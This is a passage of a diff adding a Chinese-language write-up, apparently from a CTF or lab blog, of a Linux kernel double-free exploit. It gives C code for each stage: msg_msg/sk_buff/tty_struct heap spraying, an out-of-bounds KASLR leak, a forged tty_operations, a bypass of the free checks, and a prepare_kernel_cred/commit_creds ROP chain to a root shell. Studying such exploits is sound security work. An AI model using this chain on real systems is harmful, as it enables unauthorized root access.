+                                   /* total size (bytes):   16 */
+                               } m_list;
+/* 0x0010      |  0x0008 */    long m_type;
+/* 0x0018      |  0x0008 */    size_t m_ts;
+/* 0x0020      |  0x0008 */    struct msg_msgseg *next;
+/* 0x0028      |  0x0008 */    void *security;
+
+                               /* total size (bytes):   48 */
+                             }
+```
+
+```
+内存结构重叠示意图：
++-------------------------------+     +-------------------------------+
+| msg_msg结构                   |     | tty_struct结构                |
+|                               |     |                               |
+| m_list.next   : 0x...         |     | magic       : 0x00010501      |
+|                               |     | kref        : ...             |
+| m_list.prev   : 0x...         |     | dev         : ...             |
+| m_type        : 0x41          |     | driver      : 0xffff...       |
+| m_ts          : 0x3e0         |     | ops         : 0xffff....      |
+| ...                           |     | ...                           |
++-------------------------------+     +-------------------------------+
+        重叠前视图                       重叠后实际内容
+
+tty_struct关键字段布局：
++0x0000: magic (4字节) + kref (4字节)  = 8字节
++0x0008: dev指针 (8字节)
++0x0010: driver指针 (8字节)
++0x0018: ops指针 (8字节)  <-- 关键控制点
++0x0020: index (4字节)
+```
+
+**技术要点**：
+
+- Double Free创建内存管理异常状态
+- `tty_struct`堆喷实现内存重用
+- 结构重叠为信息泄露创造条件
+- 大量堆喷确保高成功率
+
+### 5-6. 阶段5：目标识别
+
+**技术目标**：识别包含重叠结构的目标消息队列，确定哪个`msg_msg`结构与`tty_struct`结构重叠。这个阶段是信息获取的开始，为后续的信息泄露和地址计算提供基础。
+
+**核心实现**：
+
+```c
+void phase_5_identify_victim(void) {
+  log.info("PHASE 5: IDENTIFY VICTIM OBJECT & LEAK KERNEL BASE");
+
+  log.info("Scanning message queues to locate UAF victim");
+  victim_qid = -1;
+  for (int i = 0; i < MSG_QUEUE_NUM; i++) {
+    int ret = peek_msg(msqid[i], &msg_data, sizeof(msg_data), 0);
+    if (ret != (MSG_SIZE - sizeof(struct msg_msg))) {
+      victim_qid = i;
+      log.success("Victim queue ID: %d, unexpected read size: %d", victim_qid, ret);
+      break;
+    }
+  }
+  if (victim_qid == -1) {
+    err_exit("Failed to locate UAF in message queues!");
+  }
+}
+```
+
+**实现细节**：
+
+目标识别的过程基于一个关键的观察：当通过消息队列接口读取与`tty_struct`重叠的内存时，返回的数据特征会与正常消息不同。正常`msg_msg`结构包含消息头和用户数据，而`tty_struct`结构包含完全不同的字段。`peek_msg`函数（内部调用`msgrcv` with `MSG_COPY | IPC_NOWAIT`标志）被用来检查每个消息队列的内容。`MSG_COPY`标志确保读取操作不会修改消息内容，`IPC_NOWAIT`标志避免操作阻塞。
+
+当读取到重叠结构时，返回的数据大小会异常，因为`tty_struct`结构的内容被当作消息数据返回。正常消息的预期大小为`MSG_SIZE - sizeof(struct msg_msg)`，而读取`tty_struct`时返回的数据大小会不同。通过检查`peek_msg`的返回值是否等于预期值，可以识别包含重叠结构的目标消息队列。
+
+识别目标队列后，需要关闭所有`tty_struct`文件描述符，释放相关内存，为后续的`sk_buff`堆喷创造条件。`tty_struct`的释放会触发内核中的清理操作，包括减少引用计数、释放关联资源等，但核心的内存块会被返回到`kmalloc-1k`缓存中，可以被其他类型的对象重用。
+
+**技术要点**：
+
+- 异常读取大小识别目标队列
+- 部分覆盖结构提供信息泄露可能
+- 目标识别为后续操作提供准确目标
+- 资源释放为内存状态转换创造条件
+
+### 5-7. 阶段6：越界读取与邻近对象泄露
+
+**技术目标**：在释放`tty_struct`后，通过`sk_buff`堆喷建立新的内存重叠，构造越界读取条件，泄露同一内存页中邻近消息队列的地址信息。这个阶段扩展了信息获取范围，为后续的虚假结构构造提供目标。
+
+**核心实现**：
+
+```c
+void phase_6_oob_read_leak(void) {
+  log.info("PHASE 6: OUT-OF-BOUNDS READ TO LEAK ADJACENT OBJECTS");
+
+  log.info("Closing all tty_structs to free memory for OOB read");
+  for (int i = 0; i < TTY_SPRAY_COUNT; i++) {
+    close(ptmx_fds[i]);
+  }
+
+  log.info("Constructing fake msg_msg for OOB read (size: %d bytes)", OOB_MSG_SIZE);
+  build_msg((struct msg_msg *)fake_msg, 0, 0, MSG_TYPE,
+            OOB_MSG_SIZE - sizeof(struct msg_msg), 0, 0);
+
+  log.info("Spraying sk_buff objects to fill memory hole");
+  if (spray_sk_buff(sock_fds, fake_msg, sizeof(fake_msg)) < 0) {
+    log.error("Failed to spray sk_buff!");
+    exit(-1);
+  }
+  log.success("sk_buff spraying completed");
+}
+```
+
+**实现细节**：
+
+内存状态的转换是这个阶段的起点。在阶段5结束时，`tty_struct`文件描述符被关闭，对应的`tty_struct`结构被释放，在内存中留下一个空洞。这个空洞现在可以被其他类型的对象占用。通过`sk_buff`堆喷，这个空洞被`sk_buff`结构填充，形成`sk_buff`与`msg_msg`的新重叠。`sk_buff`是Linux网络子系统的核心数据结构，通过套接字写入操作可以分配和控制这些结构。
+
+越界读取的关键在于修改`msg_msg`结构的`m_ts`字段。这个字段表示消息的总大小，决定了通过消息队列接口可以读取多少数据。正常消息的`m_ts`值为`MSG_SIZE - sizeof(struct msg_msg)`，即消息数据部分的大小。通过将这个值修改为更大的值（`OOB_MSG_SIZE - sizeof(struct msg_msg)`，其中`OOB_MSG_SIZE`为0x1000），可以扩展可读取的范围。扩展后的读取范围可以覆盖同一内存页中的相邻对象，实现越界访问。
+
+```
+内存页布局和越界读取范围：
+内存页边界: 0xffff88800abc1000 - 0xffff88800abc2000 (4KB)
+
++------------------------+ 0xffff88800abc1000
+| msg_msg (victim)       | <- 读取起点
+| m_ts = 0x1000          |
+| ...                    |
++------------------------+ 0xffff88800abc1200
+| 空闲区域               |
++------------------------+ 0xffff88800abc1400
+| msg_msg (邻近1)        | <- 越界读取可访问
+| m_list.next = 0x...    |
+| m_type = 0x41          |
++------------------------+ 0xffff88800abc1800
+| msg_msg (邻近2)        | <- 越界读取可访问
+| ...                    |
++------------------------+ 0xffff88800abc1c00
+| 其他内核对象           |
++------------------------+ 0xffff88800abc2000
+```
+
+`sk_buff`堆喷在这个过程中扮演双重角色。首先，它填充内存空洞，建立`sk_buff`与`msg_msg`的重叠。其次，通过控制`sk_buff`的数据内容，可以间接修改重叠的`msg_msg`结构。具体来说，`sk_buff`的数据缓冲区与`msg_msg`结构的用户数据部分重叠，通过向套接字写入特定格式的数据，可以修改`msg_msg`结构的头部字段，包括`m_ts`。这种间接修改需要精确的偏移计算，确保数据写入正确的位置。
+
+通过`peek_msg`执行越界读取，扩展的读取范围可以获取同一内存页中的邻近内存内容。在读取的数据中搜索邻近的`msg_msg`结构，通过检查特定的模式（如`MSG_TYPE`标识）来识别。发现邻近`msg_msg`结构后，可以提取关键信息，包括`m_list.next`指针、队列ID等，计算邻近消息队列的地址。
+
+**技术要点**：
+
+- 修改`m_ts`字段实现越界读取
+- `sk_buff`堆喷控制`msg_msg`结构
+- 内存页布局利用获取邻近对象信息
+- 地址计算为后续利用提供目标
+
+### 5-8. 阶段7：内核基址泄露
+
+**技术目标**：通过越界读取泄露内核符号地址，计算内核基址，绕过KASLR保护。这个阶段是信息获取的关键，为后续的代码执行提供必要的地址信息。
+
+**核心实现**：
+
+```c
+void phase_7_leak_kernel(void) {
+  log.info("PHASE 7: LEAK KERNEL BASE ADDRESS");
+
+  fake_msg_msgseg_addr = (nearby_msg_queue_addr & 0xfffffffff0000000) + 0x9d000 - 0x20;
+  build_msg((struct msg_msg *)fake_msg,
+            nearby_msg_queue_addr + 0xc0,
+            nearby_msg_queue_addr + 0xc0,
+            MSG_TYPE,
+            OOB_MSG_SIZE - sizeof(struct msg_msgseg) + MSG_SIZE - sizeof(struct msg_msg),
+            fake_msg_msgseg_addr, 0);
+
+  log.info("Performing extended OOB read to leak kernel symbols");
+  peek_msg(msqid[victim_qid], &oob_msg_data,
+           OOB_MSG_SIZE - sizeof(struct msg_msgseg) + MSG_SIZE - sizeof(struct msg_msg) + 0x8, 0);
+  leak_data = (size_t *)&oob_msg_data.mtext[OOB_MSG_SIZE - sizeof(struct msg_msg)];
+  kernel_offset = leak_data[3] - SECONDARY_STARTUP_64;
+  kernel_base += kernel_offset;
+  log.success("Leaked secondary_startup_64: 0x%lx", leak_data[3]);
+  log.success("Kernel base address: 0x%lx", kernel_base);
+  log.success("Kernel offset: 0x%lx", kernel_offset);
+}
+```
+
+**实现细节**：
+
+内核基址泄露是绕过KASLR的关键步骤。KASLR通过随机化内核代码和数据的加载地址来增加漏洞利用的难度，没有内核地址信息，后续的代码执行几乎不可能实现。通过越界读取邻近的消息队列，可以泄露内核符号的地址，进而计算内核基址。
+
+首先释放之前的`sk_buff`堆喷，重新构建包含`msg_msgseg`指针的扩展消息。`msg_msgseg`是消息段结构，用于管理超过一个页面大小的消息。通过构造包含`msg_msgseg`指针的消息，可以控制更复杂的内存布局，为泄露内核符号创造条件。
+
+在构造的伪造消息中，设置`m_list.next`和`m_list.prev`指针为邻近消息队列地址加上固定偏移0xc0，满足链表完整性要求。设置`m_ts`字段为扩展的大小，允许读取更多数据。设置`next`指针指向一个伪造的`msg_msgseg`地址，这个地址基于邻近消息队列地址计算得出。
+
+通过`peek_msg`执行扩展的越界读取，读取的数据包含邻近消息队列的内容。在读取的数据中搜索内核符号`secondary_startup_64`的地址。`secondary_startup_64`是内核启动早期的一个符号，通常位于内核镜像的开头附近，是计算内核基址的理想选择。通过泄露这个符号的地址，结合已知的编译时偏移`SECONDARY_STARTUP_64`，可以精确计算KASLR偏移。
+
+```
+KASLR计算示意图：
+泄露的secondary_startup_64地址: 0xffffffff81001040
+已知的SECONDARY_STARTUP_64偏移: 0xffffffff81000040
+计算内核偏移: kernel_offset = 0xffffffff81001040 - 0xffffffff81000040 = 0x1000
+内核基址: kernel_base = DEFAULT_KERNEL_BASE + 0x1000 = 0xffffffff81000000 + 0x1000
+```
+
+计算得到的KASLR偏移可以用于计算所有内核符号的实际运行时地址。将KASLR偏移加到已知的编译时地址上，就得到运行时的实际地址。这对于后续构造ROP链和控制流劫持至关重要。
+
+成功获取内核地址信息后，利用过程获得了关键的"地图"，知道了内核代码和数据的布局。这使得后续的代码执行成为可能，因为现在可以计算gadget地址、函数地址等。没有这个信息，ROP链构造是盲目的，成功率极低。
+
+**技术要点**：
+
+- 通过越界读取泄露内核符号地址
+- 计算KASLR偏移和内核基址
+- 为后续代码执行提供必要的地址信息
+- 绕过KASLR保护机制
+
+### 5-9. 阶段8：伪造tty_struct操作函数表
+
+**技术目标**：在邻近消息队列中构造伪造的`tty_operations`结构，在`ioctl`函数指针位置放置栈迁移gadget，为控制流劫持做准备。利用内核链表操作副作用泄露虚假结构的地址，验证内存控制的有效性。
+
+**核心实现**：
+
+```c
+void phase_8_build_fake_ops(void) {
+  log.info("PHASE 8: FAKE TTY_STRUCT OPERATIONS CONSTRUCTION");
+
+  log.info("Preparing fake tty_struct->ops in nearby message queue");
+  *(size_t *)&msg_data.mtext[0] = MSG_TYPE;
+  // tty_operations->ioctl = kernel_offset + PUSH_RBX_POP_RSP_POP_RBP_RET
+  *(size_t *)&msg_data.mtext[0x60 - sizeof(struct msg_msg)] = kernel_offset + PUSH_RBX_POP_RSP_POP_RBP_RET;
+
+  if (write_msg(msqid[nearby_qid], &msg_data, sizeof(msg_data), MSG_TYPE) < 0) {
+    log.error("Failed to write fake ops to queue %d!", nearby_qid);
+    exit(-1);
+  }
+  log.success("Fake ops written to queue %d", nearby_qid);
+}
+```
+
+**实现细节**：
+
+虚假结构的构造基于对`tty_operations`结构布局的深入理解。`tty_operations`是一个包含多个函数指针的结构体，对应终端设备的各种操作：`open`、`close`、`write`、`ioctl`等。其中`ioctl`函数在调用`ioctl`系统调用处理终端设备时被调用，这是触发控制流劫持的理想点。
+
+在`tty_operations`结构体中，`ioctl`函数指针位于偏移0x60处。通过将这个指针修改为栈迁移gadget地址`PUSH_RBX_POP_RSP_POP_RBP_RET`，可以在调用`ioctl`时劫持控制流。这个gadget的选择基于其功能：它将RBX(tty_struct地址)寄存器的值压栈，然后从栈中弹出新的RSP和RBP值，最后返回，实现栈指针的迁移。
+
+```
+tty_operations结构布局：
++0x00: lookup
++0x08: install
++0x10: remove
++0x18: open
++0x20: close
++0x28: shutdown
++0x30: cleanup
++0x38: write
++0x40: put_char
++0x48: flush_chars
++0x50: write_room
++0x58: chars_in_buffer
++0x60: ioctl  <-- 修改这个指针
++0x68: compat_ioctl
+...
+```
+
+在邻近消息队列中写入第二个消息，消息内容被构造为伪造的`tty_operations`结构。在偏移`0x60 - sizeof(struct msg_msg)`处写入栈迁移gadget地址。当向邻近消息队列写入第二个消息时，内核会自动更新消息队列的链表结构。第一个消息的`msg_msg->m_list.next`指针会被修改为指向第二个消息。这个操作是内核正常功能的一部分，但可以被恶意利用。由于第一个消息可以通过越界读取访问，其`next`指针的值可以被读取，从而泄露第二个消息的地址，也就是伪造`tty_operations`结构的地址。
+
+通过再次执行越界读取，从目标消息队列获取邻近队列的第一个消息，从中提取`m_list.next`指针的值。这个值就是伪造`tty_operations`结构的地址，存储为`nearby_msg_msg_addr`。验证这个地址的合理性（例如，是否在合理的堆地址范围内，是否与预期值一致）可以确认虚假结构构造成功。
+
+**技术要点**：
+
+- 伪造`tty_operations`结构控制执行流
+- 栈迁移gadget实现栈指针控制
+- 链表操作副作用泄露地址信息
+- 地址验证确保控制可靠性
+
+### 5-10. 阶段9：绕过释放检查
+
+**技术目标**：构造特殊的`msg_msg`结构，绕过内核释放时的链表完整性检查，确保能够安全释放目标消息。通过`sk_buff`重新控制内存状态，建立新的重叠条件，为最终的payload部署做好准备。
+
+**核心实现**：
+
+```c
+void phase_9_bypass_free_checks(void) {
+  log.info("PHASE 9: BYPASS FREE CHECKS WITH FORGED MSG_MSG");
+
+  log.info("Constructing forged msg_msg to bypass free() validation");
+  build_msg((struct msg_msg *)fake_msg, nearby_msg_queue_addr + 0xc0,
+            nearby_msg_queue_addr + 0xc0, MSG_TYPE,
+            MSG_SIZE - sizeof(struct msg_msg), 0, 0);
+
+  log.info("Re-spraying sk_buff with forged msg_msg");
+  if (spray_sk_buff(sock_fds, fake_msg, sizeof(fake_msg)) < 0) {
+    log.error("Failed to re-spray sk_buff!");
+    exit(-1);
+  }
+  log.success("Forged msg_msg sprayed successfully");
+
+  log.info("Triggering free of forged msg_msg");
+  read_msg(msqid[victim_qid], &msg_data, sizeof(msg_data), 0);
+}
+```
+
+**实现细节**：
+
+链表完整性检查是现代Linux内核的重要安全机制之一。当内核释放`msg_msg`结构时，它会检查该结构在消息队列链表中的前后指针是否一致。具体来说，会检查`m_list.next->prev`和`m_list.prev->next`是否都指向当前消息队列地址。这个检查旨在检测内存损坏和某些类型的利用。如果指针不一致，内核可能触发警告或直接崩溃。为了后续利用，必须确保释放的`msg_msg`结构通过这个检查，否则利用链会中断。
+
+伪造`msg_msg`结构的构造是为了满足链表检查的要求。通过`build_msg`函数构建一个新的`msg_msg`结构，将其`m_list.next`和`m_list.prev`指针都设置为`nearby_msg_queue_addr + 0xc0`。这个地址是之前泄露的邻近消息队列地址加上固定偏移0xc0。选择这个值的原因是它可能对应消息队列中某个有效的位置，使得链表检查通过。精确的偏移值需要根据内核版本和结构布局确定，0xc0是一个常见值，但实际可能不同。
+
+重新堆喷`sk_buff`是为了将伪造的`msg_msg`结构写入目标内存。由于`sk_buff`与`msg_msg`存在内存重叠，通过向套接字写入包含伪造`msg_msg`头部的数据，可以修改目标内存中的`msg_msg`结构。这个操作需要精确的偏移控制，确保伪造的头部覆盖正确的位置。成功覆盖后，目标内存中的`msg_msg`结构就具有了合法的链表指针，可以通过内核的检查。
+
+触发释放操作是通过`read_msg`系统调用实现的。这个调用会从消息队列中移除并释放消息，触发`msg_msg`结构的释放流程。由于链表指针已经被正确设置，释放操作应该通过完整性检查，正常完成。成功的释放操作在内存中创建一个空洞，这个空洞可以被重新分配。更重要的是，释放操作不会导致内核崩溃，保持了系统的稳定性，这是后续操作的前提。
+
+```
+内存状态转换流程图：
++---------------------+     +---------------------+     +---------------------+
+| sk_buff/msg_msg     |     | 内存空洞            |     | tty_struct/sk_buff  |
+| 重叠状态            | --> | 释放msg_msg后       | --> | 重新堆喷后新重叠    |
+| (阶段6结束时)       |     |                     |     | (阶段9结束时)       |
++---------------------+     +---------------------+     +---------------------+
+         |                          |                          |
+         | 1. 伪造msg_msg结构       | 2. 通过sk_buff写入       | 3. 释放msg_msg
+         |    设置合法指针          |    修改目标内存          |    通过完整性检查
+         |                          |                          |
+         v                          v                          v
++---------------------+     +---------------------+     +---------------------+
+| 准备释放            | --> | 释放完成            | --> | tty_struct堆喷      |
+| 链表指针已设置      |     | 创建空洞            |     | 建立新重叠          |
++---------------------+     +---------------------+     +---------------------+
+```
+
+成功释放目标消息后，重新堆喷`tty_struct`结构，建立`tty_struct`与`sk_buff`的新重叠。这种新的重叠状态为最终的控制流劫持创造了条件。在新的状态下，`tty_struct`结构在上层，`sk_buff`结构在下层，通过控制`sk_buff`的数据可以间接修改`tty_struct`结构。
+
+**技术要点**：
+
+- 链表指针伪造绕过完整性检查
+- 安全释放避免内核崩溃
+- 内存状态转换建立新的控制条件
+- 资源清理优化内存使用
+
+### 5-11. 阶段10：ROP链构建与布局
+
+**技术目标**：构建完整的ROP链，通过`sk_buff`控制`tty_struct`结构，设置控制流劫持所需的所有组件。精心选择gadget实现权限提升和用户空间返回，准备最终的payload部署。
+
+**核心实现**：
+
+```c
+void phase_10_build_rop_chain(void) {
+  log.info("PHASE 10: ROP CHAIN CONSTRUCTION & CONTROL FLOW HIJACK");
+
+  log.info("Building fake tty_struct structure");
+  fake_tty_struct = (size_t *)fake_msg;
+  fake_tty_struct[0] = 0x0000000100005401;  // magic (4字节) + kref.refcount (4字节)
+  fake_tty_struct[1] = kernel_offset + ADD_RSP_0X50_RET;  // dev指针
+  fake_tty_struct[2] = nearby_msg_msg_addr; // tty_struct->driver
+  fake_tty_struct[3] = nearby_msg_msg_addr; // tty_struct->ops
+
+  log.info("Constructing ROP chain for privilege escalation");
+  rop_chain = (uint64_t *)&fake_msg[0x50];
+  rop_idx = 0;
+  rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;
+  rop_chain[rop_idx++] = 0;
+  rop_chain[rop_idx++] = kernel_offset + PREPARE_KERNEL_CRED;
+  rop_chain[rop_idx++] = kernel_offset + POP_RCX_RET;
+  rop_chain[rop_idx++] = 0;
+  rop_chain[rop_idx++] = kernel_offset + MOV_RDI_RAX_REP_MOVSQ_RDI_RSI_RET;
+  rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;
+  rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 0x22;
+  rop_chain[rop_idx++] = (size_t)get_root_shell;
+  rop_chain[rop_idx++] = user_cs;
+  rop_chain[rop_idx++] = user_rflags;
+  rop_chain[rop_idx++] = user_sp + 8;
+  rop_chain[rop_idx++] = user_ss;
+}
+```
+
+**实现细节**：
+
+伪造`tty_struct`结构的构造是这个阶段的起点。在`fake_msg`缓冲区的开头构造一个伪造的`tty_struct`结构，根据实际结构布局设置关键字段。`tty_struct`的第一个8字节包含`magic`（4字节）和`kref.refcount`（4字节），设置为固定值`0x0000000100005401`。第二个8字节是`dev`指针，设置为栈迁移gadget`ADD_RSP_0X50_RET`的地址。第三个8字节是`driver`指针，设置为伪造的`tty_operations`结构地址。第四个8字节是`ops`指针，也设置为伪造的`tty_operations`结构地址。
+
+```
+控制流劫持执行路径：
+1. ioctl系统调用触发tty_struct->ops->ioctl()
+2. 跳转到PUSH_RBX_POP_RSP_POP_RBP_RET gadget
+3. 执行: push rbx; sub eax, 0x415b0007; pop rsp; pop rbp; ret
+4. 栈指针迁移到tty_struct->dev (ADD_RSP_0X50_RET地址)
+5. 执行ADD_RSP_0X50_RET，栈指针增加0x50
+6. 跳转到ROP链起始位置
+7. 执行权限提升ROP链
+8. 返回用户空间执行get_root_shell
+```
+
+ROP链的设计体现了权限提升的经典模式。链中的第一个有效gadget是`POP_RDI_RET`，它将立即数0加载到RDI寄存器，作为`prepare_kernel_cred`函数的参数。在Linux内核中，`prepare_kernel_cred(0)`调用创建具有root权限的凭证结构。接下来调用`PREPARE_KERNEL_CRED`函数，其返回值（新凭证的指针）存储在RAX寄存器中。然后通过`POP_RCX_RET`清理RCX寄存器，再通过`MOV_RDI_RAX_REP_MOVSQ_RDI_RSI_RET`将RAX中的凭证指针移动到RDI寄存器。这个gadget通常用于内存复制，但这里利用它将凭证指针从RAX移动到RDI。最后调用`COMMIT_CREDS`函数，将新凭证应用到当前进程。
+
+用户空间返回是ROP链的最后部分。调用`SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 0x22`返回用户空间。这个gadget执行多个操作：交换GS寄存器（从内核GS切换到用户GS）、恢复用户空间寄存器、执行`sysretq`或`iretq`返回。偏移+0x22跳过了一些不需要的操作。返回地址设置为`get_root_shell`函数的地址，这是用户空间的函数，将生成一个root shell。同时恢复阶段1保存的寄存器状态：`user_cs`、`user_rflags`、`user_sp+8`、`user_ss`。栈指针加8是为了跳过一些值，确保正确的栈对齐。
+
+```
+完整payload内存布局：
+fake_msg缓冲区 (704字节)
++0x00: magic + kref (0x0000000100005401)
++0x08: ADD_RSP_0X50_RET (tty_struct.dev)
++0x10: nearby_msg_msg_addr (tty_struct.driver)
++0x18: nearby_msg_msg_addr (tty_struct.ops)
++0x20: ... (tty_struct其他字段)
++0x50: ROP链开始
+  [0]: 填充
+  [1]: POP_RDI_RET
+  [2]: 0
+  [3]: PREPARE_KERNEL_CRED
+  [4]: POP_RCX_RET
+  [5]: 0
+  [6]: MOV_RDI_RAX_REP_MOVSQ_RDI_RSI_RET
+  [7]: COMMIT_CREDS
+  [8]: SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE+0x22
+  [9]: get_root_shell地址
+  [10]: user_cs
+  [11]: user_rflags
+  [12]: user_sp+8
+  [13]: user_ss
+```
+
+`sk_buff`的最终堆喷是payload部署的关键步骤。通过向所有套接字写入包含完整payload的`fake_msg`缓冲区，大量`sk_buff`结构被分配，其中一些将与目标`tty_struct`重叠。由于`sk_buff`与`tty_struct`共享内存，写入`sk_buff`的数据会修改`tty_struct`结构的内容。特别是会修改`tty_struct->ops`指针，使其指向伪造的`tty_operations`结构。成功部署后，当目标终端设备被调用`ioctl`时，控制流将被劫持到精心构造的ROP链。
+
+**技术要点**：
+
+- 完整ROP链实现权限提升和用户空间返回
+- 栈迁移控制执行流转移
+- 精心选择的gadget确保执行成功
+- 用户空间状态正确恢复
+- payload精确部署到目标内存区域
+
+### 5-12. 阶段11：触发利用与权限获取
+
+**技术目标**：对所有`tty_struct`文件描述符调用`ioctl`系统调用，触发`tty_struct->ops->ioctl`函数执行，激活ROP链，获取root权限。验证利用成功并执行root shell，完成整个利用过程。
+
+**核心实现**：
+
+```c
+void phase_11_trigger_exploit(void) {
+  log.info("PHASE 11: TRIGGER EXPLOIT & GAIN ROOT PRIVILEGES");
+
+  log.info("Call ioctl to trigger fake ops->release handler");
+  for (int i = 0; i < TTY_SPRAY_COUNT; i++) {
+    ioctl(ptmx_fds[i], 0xdeadbeaf, 0xdeadbeaf);
+  }
+
+  log.success("Exploit triggered! Check for root shell...");
+}
+```
+
+**实现细节**：
+
+`ioctl`系统调用是触发机制的关键。在Linux内核中，当进程调用`ioctl`系统调用处理终端设备时，内核会查找`tty_operations`结构中的`ioctl`函数指针并调用它。在正常系统中，`ioctl`函数执行特定的终端控制操作。但在被利用的系统中，`tty_struct->ops`指针已被修改为指向伪造的`tty_operations`结构，其中`ioctl`指针指向栈迁移gadget`PUSH_RBX_POP_RSP_POP_RBP_RET`。因此，`ioctl`调用不会执行正常的控制逻辑，而是跳转到可控的代码路径。
+
+控制流劫持的执行路径是精心设计的多级跳转。第一跳：当内核调用`tty_struct->ops->ioctl()`时，控制流转到`PUSH_RBX_POP_RSP_POP_RBP_RET`。此时RBX寄存器的值为当前tty_struct地址，这个gadget将RBX值压栈保存，然后从栈顶弹出新的RSP和RBP值。第二跳：栈指针被设置为`tty_struct->dev`指针的值，这个值在阶段10中被设置为`ADD_RSP_0X50_RET` gadget的地址。控制流转到这个gadget，将栈指针增加0x50。第三跳：增加后的栈指针指向`fake_msg[0x50]`，这里存放着ROP链的第一个gadget地址`POP_RDI_RET`，控制流正式进入ROP链执行阶段。
+
+```
+完整触发和执行流程：
++---------------------+     +---------------------+     +---------------------+
+| 调用ioctl系统调用   | --> | 调用ioctl()操作     | --> | 跳转到栈迁移gadget  |
++---------------------+     +---------------------+     +---------------------+
+         |                          |                          |
+         v                          v                          v
++---------------------+     +---------------------+     +---------------------+
+| 执行ADD_RSP_0X50_RET| --> | 开始执行ROP链       | --> | 调用prepare_        |
++---------------------+     +---------------------+     | kernel_cred(0)      |
+         |                          |                    +---------------------+
+         v                          v                          v
++---------------------+     +---------------------+     +---------------------+
+| 调用commit_creds()  | --> | 返回用户空间        | --> | 执行root shell      |
++---------------------+     +---------------------+     +---------------------+
+```
+
+**技术要点**：
+
+- `ioctl`系统调用触发控制流劫持
+- 多级控制流转跳实现稳定执行
+- 权限提升ROP链修改进程凭证
+- 安全返回用户空间确保系统稳定
+- root shell生成提供完整系统访问
+
+### 5-13. 技术对比
+
+以下是`tty_struct`利用与`pipe_buffer`利用的技术对比：
+
+| 对比维度       | tty_struct利用                      | pipe_buffer利用                        |
+| -------------- | ----------------------------------- | -------------------------------------- |
+| **目标结构**   | `tty_struct` (696字节)              | `pipe_buffer` (1KB)                    |
+| **所属缓存**   | kmalloc-1k                          | kmalloc-1k                             |
+| **触发机制**   | `ioctl()`系统调用                   | `close()`文件描述符                    |
+| **控制点**     | `tty_struct->ops->ioctl` (偏移0x60) | `pipe_buffer->ops->release` (偏移0x18) |
+| **结构复杂度** | 高 (696字节，多字段)                | 低 (约40-80字节)                       |
+| **利用难度**   | 较高 (需要处理复杂结构)             | 较低 (结构简单)                        |
+| **隐蔽性**     | 高 (`ioctl`是正常操作)              | 中 (`close`是正常操作)                 |
+| **可靠性**     | 中 (涉及复杂子系统)                 | 高 (触发路径简单)                      |
+| **信息泄露**   | 通过越界读取                        | 通过类型混淆                           |
+| **内存布局**   | 大小不匹配 (696字节 vs 1KB)         | 大小匹配 (1KB vs 1KB)                  |
+| **缓存特性**   | 同属kmalloc-1k，可相互覆盖          | 同属kmalloc-1k，可相互覆盖             |
+| **防御绕过**   | 绕过KASLR、链表检查等               | 绕过KASLR、链表检查等                  |
+| **适用场景**   | 系统启用复杂终端配置                | 系统使用管道通信                       |
+
+### 5-14. 技术总结
+
+本章详细分析了基于`tty_struct`结构的完整利用过程，通过11个精心设计的阶段逐步建立内存控制、信息泄露、结构伪造和代码执行能力，最终实现权限提升。整个利用过程展示了现代内核漏洞利用的系统性方法论，从初始内存操作到最终代码执行形成完整的技术链，每个阶段都解决特定的技术挑战并建立后续阶段所需的能力基础，综合运用了堆布局控制、类型混淆利用、信息泄露技术、安全机制绕过、控制流劫持和权限提升等多种高级技术，在对抗KASLR、内存初始化保护、链表完整性检查等安全机制的环境下实现了可靠的权限提升，体现了内核漏洞利用领域的技术深度和工程严谨性。
+
+### 5-15. 测试结果
+
+<div style="text-align: center; margin: 2rem 0;">
+  <img src="/images/posts/KernelExploit/DoubleFree/DoubleFree_002.png"
+       style="border-radius: 12px; 
+              box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+              max-width: 100%;
+              height: auto;">
+</div>
+
 ## 参考
 
 - https://github.com/BinRacer/pwn4kernel/tree/master/src/DoubleFree2
+- https://github.com/BinRacer/pwn4kernel/tree/master/src/DoubleFree3
 - https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/
